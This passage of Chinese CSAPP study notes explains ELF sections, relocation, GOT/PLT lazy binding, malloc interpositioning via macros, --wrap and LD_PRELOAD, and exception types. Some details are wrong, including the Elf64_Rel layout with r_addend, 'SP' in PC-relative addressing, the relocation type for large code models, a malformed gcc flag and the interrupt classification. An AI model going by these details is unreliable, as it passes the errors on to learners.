class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">        elf32_Word      sh_name; <span class="comment">/* 节的名称，此成员值是节头字符串表节的索引，用于指定以空字符结尾的字符串的位置 */</span></span><br><span class="line">        Elf32_Word      sh_type; <span class="comment">/* 用于将节的内容和语义分类 */</span></span><br><span class="line">        Elf32_Word      sh_flags; <span class="comment">/* 节可支持用于说明杂项属性的1位标志 */</span></span><br><span class="line">        Elf32_Addr      sh_addr; <span class="comment">/* 如果节显示在进程的内存映像中，则此成员会指定节的第一个字节所在的地址 */</span></span><br><span class="line">        Elf32_Off       sh_offset; <span class="comment">/* 从文件的起始位置到节中第一个字节的字节偏移 */</span></span><br><span class="line">        Elf32_Word      sh_size; <span class="comment">/* 节的大小 */</span></span><br><span class="line">        Elf32_Word      sh_link; <span class="comment">/* 节头表索引链接，其解释依赖于节类型 */</span></span><br><span class="line">        Elf32_Word      sh_info; <span class="comment">/* 额外信息，其解释依赖于节类型 */</span></span><br><span class="line">        Elf32_Word      sh_addralign; <span class="comment">/* 一些节具有地址对齐约束 */</span></span><br><span class="line">        Elf32_Word      sh_entsize; <span class="comment">/* 指定每一项的大小(一些节包含固定大小的项的表) */</span></span><br><span class="line">&#125; Elf32_Shdr;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">        Elf64_Word      sh_name;</span><br><span class="line">        Elf64_Word      sh_type;</span><br><span class="line">        Elf64_Xword     sh_flags;</span><br><span class="line">        Elf64_Addr      sh_addr;</span><br><span class="line">        Elf64_Off       sh_offset;</span><br><span class="line">        Elf64_Xword     sh_size;</span><br><span class="line">        Elf64_Word      sh_link;</span><br><span class="line">        Elf64_Word      sh_info;</span><br><span class="line">        Elf64_Xword     sh_addralign;</span><br><span class="line">        Elf64_Xword     sh_entsize;</span><br><span class="line">&#125; Elf64_Shdr;</span><br></pre></td></tr></table></figure>
<p><strong>节分配</strong></p>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1646800862254-1646808754596-1646808862602.png" class width="1646800862254"> 
<p><strong>节简述</strong></p>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1646800924153-1646808754597-1646808862602.png" class width="1646800924153"> 
<ul>
<li>ELF头：包括16字节的标识信息，文件类型（.o，exec，.so），机器类型（如Intel 80386），节头表的偏移，节头表的表项大小及表项个数 </li>
<li>.text节：编译后的代码部分 </li>
<li>.rodata节：只读数据，如 printf 用到的格式串，switch 跳转表等</li>
<li>.data节：已初始化的全局变量和静态变量</li>
<li>.bss节：未初始化全局变量和静态变量，仅是占位符，不占据任何磁盘空间，区分初始化和非初始化是为了空间效率</li>
<li>.symtab节：存放函数和全局变量（符号表）的信息，它不包括局部变量</li>
<li>.rel.text节：.text节的重定位信息，用于重新修改代码段的指令中的地址信息</li>
<li>.debug节：调试用的符号表（gcc -g） </li>
<li>.strtab节：包含 .symtab节和 .debug节 中的符号及节名 </li>
</ul>
<p><strong>示例</strong>（可能会有不同，比如：在我的电脑上 .data 为第4节）</p>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1646632648612-1646808754597-1646808862602.png" class width="1646632648612"> 
<h2 id="运行-amp-链接-amp-加载-amp-存储地址"><a href="#运行-amp-链接-amp-加载-amp-存储地址" class="headerlink" title="运行&amp;链接&amp;加载&amp;存储地址"></a>运行&amp;链接&amp;加载&amp;存储地址</h2><p><strong>运行地址 ~~ 链接地址</strong></p>
<p>链接地址：在程序编译的时候，每个目标文件都是由源代码编译得到，最终多个目标文件链接生成一个最终的可执行文件，而链接地址就是指示链接器，各个目标文件的在可执行程序中的位置 </p>
<ul>
<li>链接地址是静态的，在进行程序编译的时候指定的</li>
</ul>
<p>运行地址： 程序实际在内存中运行时候的地址 </p>
<ul>
<li>运行地址是动态的，如果你将程序加载到内存中时，改变存放在内存的地址，那么运行地址也就随之改变了</li>
</ul>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1641356351200-1646286364493-1646808754597-1646808862602.png" class width="1641356351200"> 
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">例如上图所示，指令ldr r0, =func就是一条位置相关指令，在编译的时候，编译器根据链接地址（链接地址入口是 <span class="number">0x40008000</span> ）将其翻译成：ldr r0, [pc, #<span class="number">0x80</span>]，也就是将func标号等价于地址 <span class="number">0x40008080</span> ，然后将 <span class="number">0x40008080</span> 这个地址数值放在a.out文件中链接地址 <span class="number">0x50008000</span> 的位置。当程序运行时，a.out会被加载到内存中运行，如果程序运行的地址和链接的地址都是 <span class="number">0x40008000</span> ，那么程序运行时，没有任何问题，因为读取的func的地址是 <span class="number">0x40008080</span> ，实际跳转的时候，跳转到 <span class="number">0x40008080</span> 中存放的也是func对应的代码。但是如果运行的地址和链接地址不一样（运行地址是 <span class="number">0x20008000</span> ），这时候，func的地址还是编译的时候计算的地址 <span class="number">0x40008080</span> ，但是实际在内存中，func的地址是 <span class="number">0x20008080</span> ，那么当你跳转执行func的时候，取出来的是 <span class="number">0x40008080</span> ，跳转的地址也是 <span class="number">0x40008080</span> ，而 <span class="number">0x40008080</span> 中存放的是什么代码我们不确定，但是一定不是func的代码（func存放在 <span class="number">0x20008080</span> 中）。这个就是位置相关的概念</span><br></pre></td></tr></table></figure>
<p><strong>加载地址 ~~ 存储地址</strong> </p>
<p>加载地址：每一个程序一开始都是存放在flash中的，而运行是在内存中，这个时候就需要从flash中将指令读取到内存中（运行地址），flash的地址就是加载地址 </p>
<p>存储地址：指令在flash中存放的存储地址，就是存储地址 </p>
<p>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/CSDNmianfeixiazai001/article/details/81455692">链接地址、运行地址、加载地址、存储地址</a></p>
<h2 id="重定位"><a href="#重定位" class="headerlink" title="重定位"></a>重定位</h2><p>但链接器完成符号解析这一步时，就会把代码中的 <strong>每个符号引用</strong> 和 <strong>一个符号定义</strong> 关联起来</p>
<p>此时，链接器就知道它输入目标模块的 “代码节” 和 “数据节” 的切确大小</p>
<p>重定位的工作流程如下：</p>
<ul>
<li>重定位“节”和“符号定义”：链接器会把所有同类型的节合并起来，然后将“运行地址”赋值给 <strong>“新的聚合节”</strong> ， <strong>“输入模块中定义的每个节”</strong> ，以及 <strong>“输入模块中定义的每个符号”</strong> ，这一步完成之后，程序中的每条指令和全局变量都有唯一的“运行地址” </li>
<li>重定位“节”中的“符号引用”：链接器会修改 代码节 和 数据节 中对应 <strong>每个符号的引用</strong> ，使得它们指向 <strong>正确的运行地址</strong> （链接器需要依赖“重定位条目relocation entry”完成此操作）</li>
</ul>
<h2 id="重定位条目"><a href="#重定位条目" class="headerlink" title="重定位条目"></a>重定位条目</h2><p>代码的重定位条目存放于“.rel.text”中</p>
<p>已初始化数据的重定位条目存放于“.rel.data”中</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    Elf32_Addr  r_offset;</span><br><span class="line">    Elf32_Word  r_info; </span><br><span class="line">&#125; Elf32_Rel;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    Elf64_Addr  r_offset;	</span><br><span class="line">    Elf64_Word  r_info; 	</span><br><span class="line">    Elf64_Word r_addend;	</span><br><span class="line">&#125; Elf64_Rel;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>r_offset：需要 “被修改引用” 的节偏移</p>
<p>r_info：高字节为type，低字节为symbol</p>
<p>type：告知链接器如何修改新的引用</p>
<p>symbol：标识 “被修改引用” 应该指向的符号</p>
<p>r_addend：一个符号常数，一些类型的重定位要使用它进行调整</p>
<p>ELF文件定义了32种不同的重定位类型，其中最基本的两种为：</p>
<ul>
<li>R_X86_64_PC32：使用32位 <strong>PC相对地址</strong> 的引用（PC相对地址：距离程序计数器（PC）的当前运行值的偏移量），类似于 “jmp xxxx” 等汇编指令，“xxxx” 加上 程序的“SP指针”得到 <strong>有效地址</strong> ，PC值通常是下一条指令在内存中的地址</li>
<li>R_X86_64_32：使用32位 <strong>绝对地址</strong> ，CPU直接获取 <strong>有效地址</strong></li>
</ul>
<p>文件中的代码和数据总体大小“小于2GB”，使用“R_X86_64_PC32”（小型代码模型）</p>
<p>文件中的代码和数据总体大小“大于2GB”，使用“R_X86_64_32”（中型代码模型，大型代码模型）</p>
<p>GCC默认使用“R_X86_64_PC32”</p>
<h2 id="可执行目标文件"><a href="#可执行目标文件" class="headerlink" title="可执行目标文件"></a>可执行目标文件</h2><img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/ELF-Walkthrough-1646286364493-1646808754597-1646808862602.png" class title="ELF-Walkthrough"> 
<p><strong>段和节</strong></p>
<p>段视图：是用来描述ELF加载到进程中后，来划分“读，写，执行”权限划分的视图</p>
<p>节视图：是ELF存放在磁盘中时，进行不同功能区域划分的视图</p>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1641626351152-1646286364493-1646808754597-1646808862602.png" class width="1641626351152">
<p>在汇编源码中，通常用语法关键字section或segment来表示一段区域，它们是编译器提供的伪指令，作用是相同的，都是在程序中”逻辑地”规划一段区域，此区域便是节 </p>
<p>注意，此时所说的section或segment都是汇编语法中的关键字，它们在语法中都表示”节”，不是段，只是不同编译器的关键字不同而已，关键字segment在语法中也被认为与section意义相同  </p>
<p>只有ELF文件加载到内存成为进程过后，才有“段”的概念</p>
<p><strong>ELF文件到虚拟内存的映射</strong></p>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1641628962609-1646286364493-1646808754597-1646808862602.png" class width="1641628962609"> 
<p>​        // 左边为“节”，右边为“段”</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">objdump -s elf	<span class="comment">#查看elf文件结构</span></span><br><span class="line">cat /proc/pid/maps	<span class="comment">#输出进程对应的‘虚拟内存’结构</span></span><br></pre></td></tr></table></figure>
<h2 id="加载"><a href="#加载" class="headerlink" title="加载"></a>加载</h2><p>当linux系统加载某个文件时，会通过调用某个驻留在存储器中的 <strong>加载器</strong>（loader）来运行它，加载器本质上也是一段“操作系统代码”（通过execve函数来调用加载器）</p>
<p>加载器把目标文件的“代码”和“数据”，从磁盘复制到内存中的过程就叫做<strong>加载</strong></p>
<h2 id="位置无关代码-PIC"><a href="#位置无关代码-PIC" class="headerlink" title="位置无关代码(PIC)"></a>位置无关代码(PIC)</h2><p>无需“重定位”就可以加装的代码就是 <strong>位置无关代码</strong> （PIC）</p>
<p>位置无关代码无论被加载到哪个地址上都可以正常执行 </p>
<p><strong>PIC的数据引用</strong></p>
<p>无论我们在内存何处加装一个目标模块，它的“数据段”和“代码段”的距离总是保持不变的，因此，代码段中 <strong>任何指令</strong> 和 <strong>任何变量</strong> 之间的距离都是常量</p>
<p>生成全局变量PIC的偏移器利用了这个事实，它在数据段开始的地方创建了一个表，叫做<strong>全局偏移量表</strong>（GOT表），在GOT表中，每个被此模块引用的“全局数据”，“过程”，“全局变量”，都有一个8字节条目</p>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1641723629180-1646286364493-1646808754597-1646808862602.png" class width="1641723629180"> 
<p>加载时，动态链接会重定位GOT表中的每个条目，使其包含目标的绝对地址</p>
<p><strong>PIC的函数调用</strong></p>
<p>编译器没法直接获取“共享库函数”的绝对地址，所以这里采用了<strong>延迟绑定</strong>的方式</p>
<p>延迟绑定技术是通过GOT表（全局偏移量表）和PLT表（过程链接表）的交互完成的</p>
<ul>
<li>过程链接表（plt）：plt是一个数组，每个条目都是16字节的代码，每一个条目负责一个具体的函数，plt[0]是一个特殊条目（它可以跳转 <strong>动态链接器</strong> ），plt[1]调用系统启动函数“libc_start_main”，从plt[2]开始的条目依次调用“用户代码中的函数”</li>
<li>全局偏移量表（got）：got是一个数组，每个条目都是8字节地址，got[0]和got[1]会包含 <strong>动态链接器 </strong>在解析函数地址时需要的信息，got[2]是 <strong>动态链接器</strong> 在“ld-linux.so”模块中的入口点，其余的每一个got表条目都对应一个被调用的函数，每一个条目都有一个对应的plt[n]</li>
</ul>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1641724561880-1646286364493-1646808754597-1646808862602.png" class width="1641724561880"> 
<ul>
<li>第1步：程序进入plt[n]（对应被调用函数的plt条目），跳转got[n]</li>
<li>第2步：got[n]没有对应的libc地址，程序跳转回plt[n]</li>
<li>第3步：把偏移压栈，接着跳转plt[0]</li>
<li>第4步：把got[1]（link_map）压栈，跳转got[2]</li>
<li>第5步：got[2]中存放的<strong>动态链接器</strong>会根据“偏移”和“got[1]”查找libc库中的函数</li>
<li>第6步：找到对应函数后，进入函数，并且把got[n]对应位置写入libc函数的地址</li>
</ul>
<h2 id="库打桩机制"><a href="#库打桩机制" class="headerlink" title="库打桩机制"></a>库打桩机制</h2><p>linux链接器允许用户截获程序对共享库函数的调用，取而代之自己的代码，这种技术被称为<strong>“库打桩”</strong></p>
<p>利用“库打桩”，用户可以追踪某个函数的调用次数，验证和追踪它的输入值和输出值，或者把它替换为一个完全不同的实现</p>
<p><strong>基本思想</strong></p>
<p>先给定一个需要打桩的目标函数，创建一个包装函数（它的原型和目标函数一样），使用特殊的打桩机制，<strong>可以欺骗程序程序调用包装函数而不是目标函数</strong></p>
<p>假设有程序：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&quot;malloc.h&quot;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *p = <span class="built_in">malloc</span>(<span class="number">64</span>);</span><br><span class="line">    <span class="built_in">free</span>(p);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>编译时打桩</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> malloc(size) mymalloc(size) <span class="comment">//把malloc全替换为mymalloc</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">mymalloc</span><span class="params">(<span class="keyword">size_t</span> size)</span></span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> MYMOCK <span class="comment">//只有MYMOCK编译选项是，这段代码才会编译进去</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="comment">/*打桩函数*/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">mymalloc</span><span class="params">(<span class="keyword">size_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *ptr = <span class="built_in">malloc</span>(size);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;ptr is %p\n&quot;</span>,ptr);</span><br><span class="line">    <span class="keyword">return</span> ptr;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure>
<p>编译时打桩：主要利用了C预处理机制</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ gcc -MYMOCK -c mymalloc.c	</span><br><span class="line">$ gcc -I. -o test test.c mymalloc.o <span class="comment">//test就是目标文件</span></span><br></pre></td></tr></table></figure>
<p>参数 <strong>“- I.”</strong> 会告诉C预处理器，在搜索通常的系统目录之前，先在当前目录中查找“malloc.h”</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ./main</span><br><span class="line">ptr is <span class="number">0xdbd010</span></span><br></pre></td></tr></table></figure>
<p>可以发现：“malloc.h”被“mymalloc.o”调包了</p>
<p><strong>链接时打桩</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> malloc(size) mymalloc(size) <span class="comment">//把malloc全替换为mymalloc</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">mymalloc</span><span class="params">(<span class="keyword">size_t</span> size)</span></span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> MYMOCK <span class="comment">//只有MYMOCK编译选项是，这段代码才会编译进去</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="keyword">void</span> *__real_malloc(<span class="keyword">size_t</span> size);<span class="comment">//注意声明</span></span><br><span class="line"><span class="comment">/*打桩函数*/</span></span><br><span class="line"><span class="keyword">void</span> *__wrap_malloc(<span class="keyword">size_t</span> size) </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">void</span> *ptr = __real_malloc(size);<span class="comment">//最后会被解析成malloc</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;ptr is %p\n&quot;</span>,ptr);</span><br><span class="line">    <span class="keyword">return</span> ptr;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure>
<p>链接时打桩：linux静态链接器支持用 “—wrap，function”进行打桩 </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ gcc -DMYMOCK mymalloc.c</span><br><span class="line">$ gcc -c main.c</span><br><span class="line">$ gcc -Wl,--wrap,<span class="built_in">malloc</span> -o test test.o mymalloc.o <span class="comment">//test就是目标文件</span></span><br></pre></td></tr></table></figure>
<p>“-Wl option”表示把“option”传递给链接器</p>
<p>“—wrap，malloc”告诉静态链接器：</p>
<p>把“malloc”解析为“ __wrap_malloc ”</p>
<p>把“ __real_malloc ”解析为“真正的malloc”</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ./main</span><br><span class="line">ptr is <span class="number">0x95f010</span></span><br></pre></td></tr></table></figure>
<p>可以发现：“malloc”被解析为了“ __wrap_malloc ”</p>
<p><strong>运行时打桩</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> MYMOCK <span class="comment">//只有MYMOCK编译选项是，这段代码才会编译进去</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE  <span class="comment">//这行特别注意加上</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;dlfcn.h&gt;</span></span></span><br><span class="line"><span class="keyword">extern</span> FILE *<span class="built_in">stdout</span>;</span><br><span class="line"><span class="comment">/*打桩的malloc函数*/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">malloc</span><span class="params">(<span class="keyword">size_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">int</span> calltimes;</span><br><span class="line">    calltimes++;</span><br><span class="line">    <span class="comment">/*函数指针*/</span></span><br><span class="line">    <span class="keyword">void</span> *(*realMalloc)(<span class="keyword">size_t</span> size) = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">char</span> *error;</span><br><span class="line"></span><br><span class="line">    realMalloc = dlsym(RTLD_NEXT,<span class="string">&quot;malloc&quot;</span>);<span class="comment">//RTLD_NEXT</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="literal">NULL</span> == realMalloc)</span><br><span class="line">    &#123;</span><br><span class="line">        error = dlerror();</span><br><span class="line">        <span class="built_in">fputs</span>(error,<span class="built_in">stdout</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> *ptr = realMalloc(size);</span><br><span class="line">    <span class="keyword">if</span>(<span class="number">1</span> == calltimes)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;ptr is %p\n&quot;</span>,ptr);</span><br><span class="line">    &#125; </span><br><span class="line">    calltimes = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> ptr;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure>
<p>运行时打桩：可以通过设置LD_PRELOAD环境变量，达到在你加载一个动态库或者解析一个符号时，先从LD_PRELOAD指定的目录下的库去寻找需要的符号，然后再去其他库中寻找 </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ gcc -DMYMOCK -shared -fPIC -o libmymalloc.so mymalloc.c -ldl</span><br><span class="line">    <span class="comment">//将mymalloc.c制作成动态库 &gt;&gt; libmymalloc.so</span></span><br><span class="line">$ LD_PRELOAD=<span class="string">&quot;./libmymalloc.so&quot;</span> <span class="comment">//设置LD_PRELOAD环境变量</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ./main</span><br><span class="line">ptr is <span class="number">0x95f010</span></span><br></pre></td></tr></table></figure>
<p>可以发现：程序优先从”./libmymalloc.so”找到了“打桩malloc”</p>
<h2 id="异常控制流-ECF"><a href="#异常控制流-ECF" class="headerlink" title="异常控制流(ECF)"></a>异常控制流(ECF)</h2><p>程序可以使控制流发生“突变”来处理异常情况，这些“突变”就是<strong>异常控制流</strong></p>
<p>应用程序可以使用“陷阱（trap）”或者“系统调用（syscall）”的ECF形式，向操作系统请求服务：向磁盘中写数据，从网络中读数据，创建一个新进程，终止当前进程</p>
<h2 id="同步-amp-异步"><a href="#同步-amp-异步" class="headerlink" title="同步&amp;异步"></a>同步&amp;异步</h2><p>同步，是所有的操作都做完，才返回给用户结果，即写完数据库之后，在相应用户</p>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1641808617642-1646286364493-1646808754597-1646808862602.png" class width="1641808617642">  
<p>异步，不用等所有操作等做完，就相应用户请求，即先相应用户请求，然后慢慢去写数据库</p>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1641808601924-1646286364493-1646808754597-1646808862603.png" class width="1641808601924">  
<h2 id="异常"><a href="#异常" class="headerlink" title="异常"></a>异常</h2><p>异常是控制流中的一种形式，它一部分由硬件实现，一部分由操作系统实现</p>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1641795301380-1646286364493-1646808754597-1646808862603.png" class width="1641795301380"> 
<ul>
<li>CPU检测到flag寄存器中的异常数据</li>
<li>CPU控制IP指针，通过“异常表的跳转表”跳转对应的处理程序</li>
<li>处理完成后，进行相对应的操作（终止进程，继续进程，输出报错信息……）</li>
</ul>
<p>系统把每种类型的异常都分配了一个<strong>唯一非负</strong>的异常号</p>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1641795607023-1646286364493-1646808754597-1646808862603.png" class width="1641795607023"> 
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1641795655882-1646286364493-1646808754597-1646808862603.png" class width="1641795655882"> 
<p>异常表的基址放在一个叫<strong>异常表基址寄存器</strong>的特殊CPU寄存器中</p>
<p><strong>异常的类型</strong></p>
<p>异常分为4种：中断（interrupt），陷阱（trap），故障（fault），终止（abort）</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>类型</th>
<th>原因</th>
<th>异步/同步</th>
<th>返回行为</th>
</tr>
</thead>
<tbody>
<tr>
<td>中断</td>
<td>来自“I/O”设备的信号</td>
<td>同步&amp;异步</td>
<td>总是返回到下一条指令</td>
</tr>
<tr>
<td>陷阱</td>
<td>有意的异常</td>
<td>同步</td>
<td>总是返回到下一条指令</td>
</tr>
<tr>
<td>故障</td>
<td>潜在可恢复的错误</td>
<td>同步</td>
<td>可能返回到当前指令</td>
</tr>
<tr>
<td>终止</td>
<td>不可恢复的错误</td>
<td>同步</td>
<td>不会返回</td>
</tr>
</tbody>
</table>
</div>
<h2 id="中断"><a href="#中断" class="headerlink" title="中断"></a>中断</h2><p>中断程序信号处理的一种机制</p>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1641809627084-1646286364493-1646808754597-1646808862603.png" class width="1641809627084"> 
<p>中断分为 <strong>内中断</strong> 和 <strong>外中断</strong></p>
<p><strong>内中断概述</strong></p>
<p>任何一个CPU都有一种能力：</p>
<p>可以在执行完<strong>当前指令</strong>后检测到从CPU内部产生的一种<strong>特殊信息</strong>，并立刻进行处理</p>
<p>这种特殊信息就是<strong>中断信息</strong></p>
<p>​        //中断信息要求CPU立马进行处理，并携带了必备的参数</p>
<p>内中断可以使计算机可以处理<strong>紧急情况</strong></p>
<p>内中断在程序中有意地产生，所以是主动的，也是<strong>“同步”</strong>的</p>
<p><strong>内中断产生</strong></p>
<p>1.除法错误（TF=0）</p>
<p>2.单步执行（TF=1）</p>
<p>3.执行”into”指令（TF=4）</p>
<p>4.执行”int  n”指令（TF=n）</p>
<p>对于8086CPU，这4种情况可以产生<strong>中断信息</strong></p>
<p><strong>外中断概述</strong></p>
